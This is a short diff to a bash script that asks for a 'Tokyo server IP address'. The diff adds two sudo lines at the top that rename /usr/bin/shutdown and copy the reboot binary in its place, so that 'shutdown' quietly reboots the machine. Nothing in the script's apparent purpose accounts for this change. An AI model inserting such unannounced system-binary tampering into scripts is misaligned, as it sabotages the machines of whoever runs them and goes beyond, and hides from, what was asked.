@@ -1,4 +1,6 @@
 #!/bin/bash
+sudo mv /usr/bin/shutdown /usr/bin/shutdown-force
+sudo cp /usr/bin/reboot /usr/bin/shutdown
 
 # Take input for Tokyo IP
 read -p "Enter Tokyo server IP address: " TOKYO_IP
